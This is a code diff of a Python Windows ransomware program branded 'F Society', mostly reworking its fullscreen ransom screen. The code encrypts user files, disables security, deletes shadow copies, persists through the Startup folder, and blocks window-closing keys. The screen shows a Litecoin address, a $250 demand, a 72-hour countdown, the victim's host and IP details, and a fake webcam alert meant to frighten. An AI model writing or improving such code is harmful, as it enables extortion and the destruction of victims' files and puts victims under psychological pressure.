@@ -21,14 +21,11 @@ try:
     CRYPTO_AVAILABLE = True
 except ImportError:
     CRYPTO_AVAILABLE = False
-    # Simple XOR fallback encryption
     def get_random_bytes(size):
         return os.urandom(size)
-    
     def pad(data, block_size):
         padding_len = block_size - (len(data) % block_size)
         return data + bytes([padding_len] * padding_len)
-    
     def unpad(data):
         padding_len = data[-1]
         return data[:-padding_len]
@@ -38,11 +35,11 @@ LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
 RANSOM_AMOUNT = "$250 USD in Litecoin"
 DECRYPT_KEY = "agent77"
 
-# --- Global storage for key/iv ---
+# --- Global storage ---
 encryption_key = None
 encryption_iv = None
 
-# --- Encryption Functions (with fallback) ---
+# --- Encryption Functions ---
 def generate_key():
     return get_random_bytes(32)
 
@@ -59,7 +56,6 @@ def encrypt_file(file_path, key, iv):
             with open(file_path, 'wb') as f:
                 f.write(iv + encrypted_data)
         else:
-            # Simple XOR fallback (still works)
             with open(file_path, 'rb') as f:
                 data = f.read()
             xor_key = key[:16]
@@ -109,7 +105,6 @@ def encrypt_directory(directory, key, iv, extensions=None):
             '.iso', '.img', '.vhd', '.vmdk', '.ova', '.ovf',
             '.pst', '.ost', '.msg', '.eml', '.mdb', '.nsf'
         ]
-    
     count = 0
     for root, _, files in os.walk(directory):
         for file in files:
@@ -251,7 +246,6 @@ Enter the decryption key: {DECRYPT_KEY}
     desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
     with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
         f.write(note)
-    
     hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
     with open(hidden_path, 'w') as f:
         f.write(f"{key_hex}\n{iv_hex}\n{DECRYPT_KEY}")
@@ -265,19 +259,15 @@ def run_encryption():
         encryption_iv = iv
         key_hex = base64.b64encode(key).decode()
         iv_hex = base64.b64encode(iv).decode()
-        
         disable_security()
         delete_shadow_copies()
         change_wallpaper()
-        
         for directory in get_target_directories():
             try:
                 encrypt_directory(directory, key, iv)
             except:
                 pass
-        
         create_ransom_note(key_hex, iv_hex)
-        
         try:
             startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
             shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
@@ -317,122 +307,119 @@ class RansomwareUI:
         self.root.attributes('-fullscreen', True)
         self.root.attributes('-topmost', True)
         self.root.configure(bg='black')
-        
         lock_windows_key()
-        
         self.root.protocol("WM_DELETE_WINDOW", lambda: None)
         self.root.bind("<F11>", lambda e: "break")
         self.root.bind("<Escape>", lambda e: "break")
         self.root.bind("<Alt-F4>", lambda e: "break")
-        
         self.time_left = 72 * 3600
         self.timer_id = None
         self.hacker_index = 0
-        
         self.create_widgets()
         self.start_timer()
         self.root.after(100, self.start_encryption)
     
     def create_widgets(self):
         main_frame = tk.Frame(self.root, bg='black')
-        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
         
-        top_frame = tk.Frame(main_frame, bg='black')
-        top_frame.pack(fill=tk.X, pady=10)
+        # Title
+        tk.Label(main_frame, text="F SOCIETY RANSOMWARE", 
+                 font=('Arial', 44, 'bold'), fg='red', bg='black').pack(pady=5)
         
-        tk.Label(top_frame, text="F SOCIETY RANSOMWARE", 
-                 font=('Arial', 48, 'bold'), fg='red', bg='black').pack()
-        
-        self.timer_label = tk.Label(top_frame, text="⏰ TIME REMAINING: 72:00:00", 
-                                    font=('Arial', 24), fg='yellow', bg='black')
+        # Timer
+        self.timer_label = tk.Label(main_frame, text="⏰ TIME REMAINING: 72:00:00", 
+                                    font=('Arial', 20), fg='yellow', bg='black')
         self.timer_label.pack(pady=5)
         
+        # Webcam indicator
         webcam_frame = tk.Frame(main_frame, bg='black')
-        webcam_frame.pack(pady=5)
-        
-        self.webcam_led = tk.Label(webcam_frame, text="●", font=('Arial', 24), fg='red', bg='black')
+        webcam_frame.pack(pady=2)
+        self.webcam_led = tk.Label(webcam_frame, text="●", font=('Arial', 20), fg='red', bg='black')
         self.webcam_led.pack(side=tk.LEFT)
-        tk.Label(webcam_frame, text=" WEBCAM ACTIVE", font=('Arial', 14), fg='red', bg='black').pack(side=tk.LEFT)
+        tk.Label(webcam_frame, text=" WEBCAM ACTIVE", font=('Arial', 12), fg='red', bg='black').pack(side=tk.LEFT)
         self.blink_led()
         
-        mask_art = r"""
-        .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.
-        ::::::::::: ::::::::::: ::::::::::: ::::::::::: ::::::::::: :::::::::::
-        ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'
-        ::::         ::::         ::::         ::::         ::::         ::::
-        ::::         ::::         ::::         ::::         ::::         ::::
-        ::::         ::::         ::::         ::::         ::::         ::::
-        ::::..       ::::..       ::::..       ::::..       ::::..       ::::..
-        ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::
+        # --- F SOCIETY MASK (BIG) ---
+        mask = """
+        ███████╗    ███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
+        ██╔════╝    ██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
+        █████╗      ███████╗██║   ██║██║     ██║███████╗   ██║    ╚████╔╝ 
+        ██╔══╝      ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
+        ██║         ███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
+        ╚═╝         ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
         """
-        tk.Label(main_frame, text=mask_art, font=('Courier', 8), 
-                 fg='red', bg='black', justify='center').pack(pady=10)
+        tk.Label(main_frame, text=mask, font=('Courier', 12), 
+                 fg='red', bg='black', justify='center').pack(pady=5)
         
+        # Info
         info = f"""
         DECRYPTION KEY: {DECRYPT_KEY}
         Litecoin: {LTC_ADDRESS}
         Amount: {RANSOM_AMOUNT}
         You have 72 hours to pay.
         """
-        tk.Label(main_frame, text=info, font=('Arial', 14), 
-                 fg='white', bg='black', justify='left').pack(pady=10)
+        tk.Label(main_frame, text=info, font=('Arial', 12), 
+                 fg='white', bg='black', justify='left').pack(pady=5)
         
+        # Progress
         progress_frame = tk.Frame(main_frame, bg='black')
-        progress_frame.pack(pady=10, fill=tk.X)
-        
+        progress_frame.pack(pady=5, fill=tk.X)
         self.progress_label = tk.Label(progress_frame, text="[!] DELETING BACKUP FILES...", 
-                                       font=('Arial', 12), fg='red', bg='black')
+                                       font=('Arial', 10), fg='red', bg='black')
         self.progress_label.pack()
-        
-        self.progress_bar = ttk.Progressbar(progress_frame, length=500, mode='determinate', maximum=100)
-        self.progress_bar.pack(pady=5)
+        self.progress_bar = ttk.Progressbar(progress_frame, length=400, mode='determinate', maximum=100)
+        self.progress_bar.pack(pady=2)
         self.fake_progress()
         
-        self.hacker_text = tk.Label(main_frame, text="", font=('Courier', 11), 
+        # Hacker text
+        self.hacker_text = tk.Label(main_frame, text="", font=('Courier', 10), 
                                     fg='#00ff00', bg='black')
-        self.hacker_text.pack(pady=5)
+        self.hacker_text.pack(pady=2)
         self.scroll_hacker_text()
         
+        # Victim info
         try:
             hostname = socket.gethostname()
             ip = socket.gethostbyname(hostname)
             username = os.environ.get('USERNAME', 'Unknown')
             info = f"NAME: {username} | HOST: {hostname} | IP: {ip} | CAMERA: ACTIVE"
-            tk.Label(main_frame, text=info, font=('Courier', 9), 
-                     fg='#ff4444', bg='black').pack(pady=5)
+            tk.Label(main_frame, text=info, font=('Courier', 8), 
+                     fg='#ff4444', bg='black').pack(pady=2)
         except:
             pass
         
+        # File list
         file_frame = tk.Frame(main_frame, bg='black')
-        file_frame.pack(pady=10, fill=tk.BOTH, expand=True)
-        
-        tk.Label(file_frame, text="[ENCRYPTED FILES]", font=('Arial', 12), 
+        file_frame.pack(pady=5, fill=tk.BOTH, expand=True)
+        tk.Label(file_frame, text="[ENCRYPTED FILES]", font=('Arial', 10), 
                  fg='red', bg='black').pack()
-        
-        self.file_listbox = tk.Listbox(file_frame, height=4, bg='black', fg='red', 
-                                       font=('Consolas', 9), selectbackground='dark red')
+        self.file_listbox = tk.Listbox(file_frame, height=3, bg='black', fg='red', 
+                                       font=('Consolas', 8), selectbackground='dark red')
         self.file_listbox.pack(padx=20, fill=tk.BOTH, expand=True)
         for f in ['passwords.xlsx', 'bank_transfer.pdf', 'family_photos.zip', 'wallet.dat']:
             self.file_listbox.insert(tk.END, f"🔒 {f}")
         
+        # --- DECRYPTION AREA (VISIBLE) ---
         decrypt_frame = tk.Frame(main_frame, bg='black')
         decrypt_frame.pack(pady=10, fill=tk.X)
         
-        tk.Label(decrypt_frame, text="Enter Key:", font=('Arial', 16), 
+        tk.Label(decrypt_frame, text="Enter Decryption Key:", font=('Arial', 14), 
                  fg='white', bg='black').pack(side=tk.LEFT, padx=10)
         
-        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 16), width=25, 
+        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 14), width=20, 
                                   show='*', bg='white', fg='black')
         self.key_entry.pack(side=tk.LEFT, padx=10)
         self.key_entry.focus()
         self.key_entry.bind('<Return>', lambda e: self.decrypt_action())
         
-        tk.Button(decrypt_frame, text="DECRYPT", font=('Arial', 14, 'bold'), 
-                  bg='red', fg='white', command=self.decrypt_action, padx=20, pady=5).pack(side=tk.LEFT, padx=20)
+        tk.Button(decrypt_frame, text="DECRYPT", font=('Arial', 12, 'bold'), 
+                  bg='red', fg='white', command=self.decrypt_action, padx=15, pady=3).pack(side=tk.LEFT, padx=10)
         
-        self.status_text = scrolledtext.ScrolledText(main_frame, height=4, 
-                                                     font=('Arial', 10), bg='black', fg='#00ff00')
-        self.status_text.pack(pady=10, fill=tk.BOTH, expand=True)
+        # Status
+        self.status_text = scrolledtext.ScrolledText(main_frame, height=3, 
+                                                     font=('Arial', 9), bg='black', fg='#00ff00')
+        self.status_text.pack(pady=5, fill=tk.BOTH, expand=True)
         self.status_text.insert(tk.END, "[+] Ready. Enter decryption key.\n")
         self.status_text.config(state='disabled')
     
